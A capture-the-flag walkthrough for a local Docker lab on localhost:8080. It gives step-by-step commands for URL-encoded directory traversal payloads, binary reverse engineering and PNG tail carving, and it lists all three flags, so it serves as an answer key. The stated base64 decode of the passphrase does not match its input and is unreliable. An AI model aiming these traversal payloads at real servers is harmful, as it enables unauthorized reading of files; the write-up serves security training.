Colombo Cyber Heist full solution walkthrough for Kali Linux

Scope and objective
Target is local CTF hosted on http localhost 8080
Three stages web exploitation reverse engineering forensics
Goal is to retrieve three flags and understand techniques used

Prerequisites on Kali Linux
Ensure the following tools are available curl wget strings file xxd base64 hexdump grep sed awk binwalk optional burp suite optional gobuster optional
Install missing tools as needed
```bash
sudo apt update
sudo apt install -y binwalk gobuster exiftool imagemagick
```

Start the CTF services
Open a terminal
Change to the project directory
```bash
cd /home/cerberusmrxi/colombo-cyber-heist
```
Bring up services using docker compose in detached mode
```bash
sudo docker-compose up --build -d
```
Verify web service is reachable
```bash
curl -I http://localhost:8080/
```
Expected result shows HTTP 200 OK
Open the site in a browser
```bash
xdg-open http://localhost:8080
```

Stage 1 web exploitation directory traversal via encoded path bypass
Navigate to the challenge page
```bash
xdg-open http://localhost:8080/web_exploit.php
```
Understand the flaw
The page reads a file path from parameter path
The filter strips raw traversal but fails to handle url encoded traversal
Allowed suffixes include log and bak

Baseline behavior check
Request a benign path to confirm the parameter is active
```bash
curl "http://localhost:8080/web_exploit.php?path=assets/logs/access.log"
```
You may see an error or harmless content which confirms the handler works

Exploit with url encoded traversal to reach backup
Request the backup configuration and save locally
```bash
curl "http://localhost:8080/web_exploit.php?path=..%2fassets%2fsecrets%2fconfig.old.bak" -o config.old.bak
```
Validate the file type and view contents
```bash
file config.old.bak
cat config.old.bak
```
Important lines to extract
SECRET_FLAG equals flag{debug_portal_exposed}
REVERSE_PASS equals aU5pYWxCGV9TdHVubmVsCWVfbGFBOw==
NEXT equals or hints to forensics page

Submit Stage 1 flag
Return to the page and submit flag{debug_portal_exposed}
You should receive success and a link to proceed

Optional proxy method with burp
Start burp suite if installed
```bash
burpsuite &
```
Set browser proxy to 127.0.0.1 port 8080
Intercept and modify parameter path to ..%2fassets%2fsecrets%2fconfig.old.bak
Confirm the same backup file is returned

Stage 2 reverse engineering use passphrase from backup
Navigate to Stage 2 page
```bash
xdg-open http://localhost:8080/reverse_binary_challenge.php
```
Decode the base64 passphrase from REVERSE_PASS
```bash
echo "aU5pYWxCGV9TdHVubmVsCWVfbGFBOw==" | base64 -d
```
Expected output is INialB_V_Stunnel_e_laA;

Obtain and execute the binary locally
```bash
wget http://localhost:8080/assets/bin/update_service_2025.bin
chmod +x update_service_2025.bin
./update_service_2025.bin
```
When prompted enter the decoded passphrase
```text
INialB_V_Stunnel_e_laA;
```
Expected output shows access granted and reveals Stage 2 flag
flag{lab_usb_anushka}
It may also point to a hidden endpoint such as hidden report viewer

Static analysis cross check optional
Identify file type and scan for helpful strings and code patterns
```bash
file update_service_2025.bin
strings update_service_2025.bin | grep -i -E "flag|pass|access|endpoint"
objdump -d update_service_2025.bin | head -n 60
```
This validates architecture and provides additional clues if needed

Stage 3 forensics extract hidden data from PNG
Navigate to the forensics page
```bash
xdg-open http://localhost:8080/forensics_artifact.php
```
Download the PNG artifact
```bash
curl -O http://localhost:8080/assets/img/colombo_packet_artifact.png
```
The hidden data is appended after the PNG IEND chunk

Quick extraction methods
Method A simple strings search
```bash
strings colombo_packet_artifact.png | grep -i flag
```
Method B read last bytes directly adjust size if needed
```bash
tail -c 200 colombo_packet_artifact.png
```
Method C binwalk overview and extraction
```bash
binwalk colombo_packet_artifact.png
binwalk -e colombo_packet_artifact.png
```
Method D hex view of the end of file
```bash
xxd colombo_packet_artifact.png | tail -n 40
```
Expected revealed flag is
flag{paylanka_shadow_turtle_trace_complete}

Submit Stage 3 flag to complete mission
Return to the page and submit the extracted flag
All stages should now appear as complete on the dashboard

Troubleshooting common issues
Service unreachable
```bash
sudo docker ps
sudo docker-compose logs
```
Rebuild containers if necessary
```bash
sudo docker-compose down
sudo docker-compose up --build -d
```
Port 8080 already used
Find and kill process or adjust docker compose port
```bash
sudo lsof -ti:8080 | xargs sudo kill
```
Or edit docker compose ports section then rebuild

If curl downloads fail verify url and network then retry
If flags do not validate check for extra whitespace and exact case match

Cleanup after completion
Stop and remove containers
```bash
cd /home/cerberusmrxi/colombo-cyber-heist
sudo docker-compose down
```

Defensive lessons learned
Decode inputs before normalization and validate strictly
Use absolute paths and allowlists for file access
Do not store sensitive backups under web root
Do not embed secrets in client side binaries prefer server side checks
Treat uploaded files as untrusted and validate before use

Final results
Stage 1 flag is flag{debug_portal_exposed}
Stage 2 flag is flag{lab_usb_anushka}
Stage 3 flag is flag{paylanka_shadow_turtle_trace_complete}

Extended optional methods and tool usage for thorough coverage

General recon with wordlists and parameter discovery
Directory brute force with gobuster
```bash
gobuster dir -u http://localhost:8080 -w /usr/share/wordlists/dirb/common.txt -t 50 -x php txt bak log conf
```
Parameter fuzz with ffuf
```bash
ffuf -u "http://localhost:8080/web_exploit.php?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc all -fs 0
```
Parameter fuzz with wfuzz
```bash
wfuzz -u "http://localhost:8080/web_exploit.php?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh 0
```

Stage 1 additional payloads and encodings
Verbose curl for response headers and path behavior
```bash
curl -v "http://localhost:8080/web_exploit.php?path=assets/logs/access.log"
```
Alternate traversal encodings
```bash
curl "http://localhost:8080/web_exploit.php?path=..%252fassets%252fsecrets%252fconfig.old.bak"
curl "http://localhost:8080/web_exploit.php?path=%2e%2e%2fassets%2fsecrets%2fconfig.old.bak"
curl "http://localhost:8080/web_exploit.php?path=..%2f..%2fassets%2fsecrets%2fconfig.old.bak"
```
Generate double encoded payload using python on Kali
```bash
python3 - << 'PY'
import urllib.parse
p = '../assets/secrets/config.old.bak'
print(urllib.parse.quote(urllib.parse.quote(p, safe=''), safe=''))
PY
```
Then request with curl
```bash
curl "http://localhost:8080/web_exploit.php?path=OUTPUT_FROM_PYTHON"
```
Use browser proxy with burp suite repeater and intruder
Send request then try payloads from seclists traversal list
```bash
locate seclists | grep Traversal -i
```
Try php filter wrapper if source code reading is allowed
Note this target restricts suffixes so this may be blocked
```bash
curl "http://localhost:8080/web_exploit.php?path=php://filter/convert.base64-encode/resource=index.php"
```
Save response for offline parsing
```bash
curl "http://localhost:8080/web_exploit.php?path=..%2fassets%2fsecrets%2fconfig.old.bak" -o loot_config.old.bak
grep -E "SECRET_FLAG|REVERSE_PASS|NEXT" loot_config.old.bak
```

Stage 2 extended reverse engineering methods
Check binary security properties
```bash
checksec --file=update_service_2025.bin || true
readelf -h update_service_2025.bin
readelf -a update_service_2025.bin | head -n 80
```
Trace library and system calls while entering passphrase
```bash
strace -o strace.log -f ./update_service_2025.bin
ltrace -o ltrace.log -f ./update_service_2025.bin
```
Disassemble and inspect quickly
```bash
objdump -Mintel -d update_service_2025.bin | less
```
Radare2 quick analysis
```bash
r2 -AA update_service_2025.bin << 'R2'
afl
iz~flag
iz~pass
aaa
afl
pdf @ main
q
R2
```
Ghidra headless analysis generate project and function graph
```bash
analyzeHeadless /tmp ghidra_colombo -import update_service_2025.bin -scriptPath /usr/share/ghidra -deleteProject
```
Debug with gdb and break on strcmp or memcmp
```bash
gdb -q ./update_service_2025.bin << 'GDB'
set disassembly-flavor intel
break *strcmp
run
GDB
```
Recover passphrase directly from base64 in one line
```bash
grep REVERSE_PASS loot_config.old.bak | cut -d '=' -f2 | tr -d '\n' | base64 -d; echo
```
If program accepts pass via argv try this form
```bash
./update_service_2025.bin INialB_V_Stunnel_e_laA;
```
Search strings with wide encoding if needed
```bash
strings -el update_service_2025.bin | grep -i flag
```

Stage 3 extended forensics and stego methods
Inspect metadata with exiftool and identify
```bash
exiftool colombo_packet_artifact.png
identify -verbose colombo_packet_artifact.png | head -n 80
```
Validate PNG structure
```bash
pngcheck -v colombo_packet_artifact.png
```
Search for appended data offset using IEND marker location
```bash
grep -a -b IEND colombo_packet_artifact.png
```
Carve appended tail after IEND using dd
Replace OFFSET with byte value plus 8
```bash
OFFSET=$(grep -a -b IEND colombo_packet_artifact.png | awk -F ':' '{print $1+8}')
dd if=colombo_packet_artifact.png of=tail.bin bs=1 skip=$OFFSET status=none
xxd tail.bin | head -n 40
strings -n 4 tail.bin
```
Try binwalk thorough recursive
```bash
binwalk -Me colombo_packet_artifact.png
```
Try foremost carving
```bash
sudo apt install -y foremost
foremost -i colombo_packet_artifact.png -o foremost_out
```
Try steghide without passphrase
```bash
steghide extract -sf colombo_packet_artifact.png -p "" || true
```
Try zsteg for LSB techniques png only
```bash
zsteg colombo_packet_artifact.png | head -n 50
```
Manual tail review with multiple sizes
```bash
tail -c 64 colombo_packet_artifact.png
tail -c 120 colombo_packet_artifact.png
tail -c 256 colombo_packet_artifact.png
```
Python quick scan for flag pattern
```bash
python3 - << 'PY'
import re
data=open('colombo_packet_artifact.png','rb').read()
m=re.search(b'flag\{[^}]+\}',data)
print(m.group(0).decode() if m else 'no flag found')
PY
```

Alternative service launch without docker
Use PHP builtin server
```bash
cd /home/cerberusmrxi/colombo-cyber-heist
php -S localhost:8080
```

Operational tips on Kali
Save all loot in a dedicated folder
```bash
mkdir -p ~/ctf_loot/colombo
mv config.old.bak loot_config.old.bak ~/ctf_loot/colombo/
cp update_service_2025.bin ~/ctf_loot/colombo/
cp colombo_packet_artifact.png ~/ctf_loot/colombo/
```
Record http traffic with curl verbose to files
```bash
curl -v "http://localhost:8080/" -o /tmp/home.html 2> /tmp/home_headers.txt
```

Validation of all flags with grep
```bash
echo flag{debug_portal_exposed}
echo flag{lab_usb_anushka}
echo flag{paylanka_shadow_turtle_trace_complete}
```
